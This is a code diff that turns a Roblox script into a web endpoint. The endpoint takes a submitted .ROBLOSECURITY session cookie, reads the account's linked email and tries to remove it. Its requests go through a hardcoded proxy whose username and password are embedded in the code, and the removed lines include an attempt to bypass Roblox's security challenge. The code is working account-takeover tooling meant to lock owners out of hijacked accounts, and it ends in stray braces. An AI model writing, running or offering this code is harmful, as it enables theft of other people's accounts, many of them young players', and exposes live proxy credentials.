@@ -1,140 +1,141 @@
-import fetch from 'node-fetch';
-import zlib from 'zlib';
-import { promisify } from 'util';
+const rp = require("request-promise");
 
-const gunzip = promisify(zlib.gunzip);
-const brotliDecompress = promisify(zlib.brotliDecompress);
-const inflate = promisify(zlib.inflate);
+const WEBSHARE_PROXY = "http://hpbhwlum:ifhjayiy2wek@38.154.227.167:5868";
 
-// CONFIGURATION
-const cookie = 'YOUR_ROBLOSECURITY_COOKIE_HERE';
-const csrfUrl = 'https://auth.roblox.com/';
-const emailInfoUrl = 'https://accountinformation.roblox.com/v1/email';
-const deleteEmailUrl = 'https://accountinformation.roblox.com/v1/email/remove';
-const challengeApiUrl = 'https://auth.roblox.com/v2/challenge';
-
-// OBTAIN CSRF
-async function getCsrfToken() {
-  const res = await fetch(csrfUrl, {
-    method: 'POST',
-    headers: {
-      Cookie: `.ROBLOSECURITY=${cookie}`
-    }
-  });
-  const token = res.headers.get('x-csrf-token');
-  if (!token) throw new Error('Failed to fetch CSRF token');
-  return token;
-}
-
-// FETCH EMAIL INFO
-async function fetchEmail(csrfToken) {
-  const res = await fetch(emailInfoUrl, {
-    headers: {
-      'X-CSRF-TOKEN': csrfToken,
-      'Cookie': `.ROBLOSECURITY=${cookie}`
-    }
-  });
-  const data = await res.json();
-  return data;
-}
-
-// ATTEMPT EMAIL DELETE
-async function deleteEmail(csrfToken) {
-  const res = await fetch(deleteEmailUrl, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-      'X-CSRF-TOKEN': csrfToken,
-      'Cookie': `.ROBLOSECURITY=${cookie}`
-    }
-  });
-
-  const buffer = await res.buffer();
-  let decompressed;
-
-  try {
-    decompressed = await brotliDecompress(buffer);
-  } catch {
-    try {
-      decompressed = await gunzip(buffer);
-    } catch {
-      try {
-        decompressed = await inflate(buffer);
-      } catch {
-        console.warn('❌ Failed all decompression methods, fallback to raw base64');
-        return {
-          challengeBlob: buffer.toString('base64'),
-          status: res.status
-        };
-      }
-    }
+module.exports = async (req, res) => {
+  if (req.method !== "POST") {
+    res.writeHead(405, { "Content-Type": "application/json" });
+    return res.end(JSON.stringify({ error: "Only POST allowed" }));
   }
 
-  const json = JSON.parse(decompressed.toString());
-  return { challengeBlob: json.dataExchangeBlob || buffer.toString('base64'), status: res.status };
-}
+  let cookie = req.body.cookie;
+  if (!cookie) {
+    res.writeHead(400, { "Content-Type": "application/json" });
+    return res.end(JSON.stringify({ error: "Missing .ROBLOSECURITY cookie" }));
+  }
 
-// SEND CHALLENGE
-async function solveChallenge(csrfToken, challengeId, blob) {
-  const payload = {
-    challengeId: challengeId,
-    actionType: 'EmailUpdate.Remove',
-    challengeMetadata: {
-      dataExchangeBlob: blob
-    }
-  };
+  cookie = cookie.trim();
+  if (cookie.includes(".ROBLOSECURITY=")) {
+    cookie = cookie.split(".ROBLOSECURITY=")[1];
+  }
 
-  const res = await fetch(challengeApiUrl, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-      'X-CSRF-TOKEN': csrfToken,
-      'Cookie': `.ROBLOSECURITY=${cookie}`
-    },
-    body: JSON.stringify(payload)
-  });
+  if (cookie.length < 50) {
+    res.writeHead(400, { "Content-Type": "application/json" });
+    return res.end(
+      JSON.stringify({ error: "Invalid .ROBLOSECURITY cookie format" })
+    );
+  }
 
-  const result = await res.json();
-  return { status: res.status, result };
-}
-
-// MAIN FLOW
-(async () => {
   try {
-    console.log('🔐 Obtaining CSRF token...');
-    const csrf = await getCsrfToken();
-    console.log('✅ CSRF token obtained.');
+    console.log("🔐 Obtaining CSRF token...");
+    const csrfToken = await getCsrfToken(cookie);
+    console.log("CSRF Token:", csrfToken);
 
-    console.log('📧 Fetching email info...');
-    const info = await fetchEmail(csrf);
-    console.log('✅ Email info:', info);
+    console.log("📧 Fetching email info...");
+    const emailInfo = await fetchEmail(cookie, csrfToken);
+    console.log("Email info:", emailInfo);
 
-    console.log('🗑️ Attempting email deletion...');
-    const { challengeBlob, status } = await deleteEmail(csrf);
-
-    if (status === 403) {
-      const challengeId = `roblox_403_${Date.now()}`;
-      console.log('🔧 Solving challenge...');
-      const { status: chStatus, result } = await solveChallenge(csrf, challengeId, challengeBlob);
-
-      if (chStatus === 200) {
-        console.log('✅ Challenge solved. Retrying email removal...');
-        const retry = await deleteEmail(csrf);
-        if (retry.status === 200) {
-          console.log('✅ Email successfully removed.');
-        } else {
-          console.log('❌ Retry failed:', retry.status);
-        }
-      } else {
-        console.log('❌ Challenge solve failed:', result);
-      }
-    } else if (status === 200) {
-      console.log('✅ Email removed without challenge.');
-    } else {
-      console.log('❌ Unexpected status:', status);
+    if (!emailInfo || (!emailInfo.emailId && !emailInfo.emailAddress)) {
+      res.writeHead(400, { "Content-Type": "application/json" });
+      return res.end(
+        JSON.stringify({
+          error:
+            "No email linked or failed to fetch email info",
+          debug: emailInfo,
+        })
+      );
     }
 
+    const emailToDelete = emailInfo.emailId || emailInfo.emailAddress;
+    console.log("🗑️ Deleting email:", emailToDelete);
+    const result = await deleteEmail(cookie, csrfToken);
+
+    if (result && result.errors && result.errors.length > 0) {
+      const error = result.errors[0];
+      res.writeHead(403, { "Content-Type": "application/json" });
+      return res.end(
+        JSON.stringify({
+          error:
+            error.message || "Challenge required to authorize request",
+          code: error.code,
+          needsChallenge: true,
+        })
+      );
+    }
+
+    res.writeHead(200, { "Content-Type": "application/json" });
+    return res.end(
+      JSON.stringify({
+        success: true,
+        message: "Email removal processed successfully",
+        result,
+      })
+    );
   } catch (err) {
-    console.error('💥 Error:', err);
+    console.error("❌ Error:", err);
+    res.writeHead(500, { "Content-Type": "application/json" });
+    return res.end(
+      JSON.stringify({
+        error: err.message || "Unknown server error",
+        type: "server_error",
+      })
+    );
   }
-})();
+};
+
+// Helper Functions (using proxy)
+
+function getCsrfToken(cookie) {
+  return rp({
+    method: "POST",
+    uri: "https://auth.roblox.com/v2/logout",
+    headers: {
+      Cookie: `.ROBLOSECURITY=${cookie}`,
+    },
+    resolveWithFullResponse: true,
+    proxy: WEBSHARE_PROXY,
+    simple: false,
+  }).then((response) => {
+    const token = response.headers["x-csrf-token"];
+    if (!token) throw new Error("Failed to get CSRF token");
+    return token;
+  });
+}
+
+function fetchEmail(cookie, csrfToken) {
+  return rp({
+    method: "GET",
+    uri: "https://accountsettings.roblox.com/v1/email",
+    headers: {
+      Cookie: `.ROBLOSECURITY=${cookie}`,
+      "X-CSRF-TOKEN": csrfToken,
+      Accept: "application/json",
+      "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    },
+    json: true,
+    proxy: WEBSHARE_PROXY,
+  });
+}
+
+function deleteEmail(cookie, csrfToken) {
+  return rp({
+    method: "POST",
+    uri: "https://accountsettings.roblox.com/v1/email",
+    headers: {
+      Cookie: `.ROBLOSECURITY=${cookie}`,
+      "X-CSRF-TOKEN": csrfToken,
+      Accept: "application/json",
+      "Content-Type": "application/json",
+      "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    },
+    body: {
+      emailAddress: "",
+    },
+    json: true,
+    proxy: WEBSHARE_PROXY,
+    simple: false,
+  });
+      }
+    
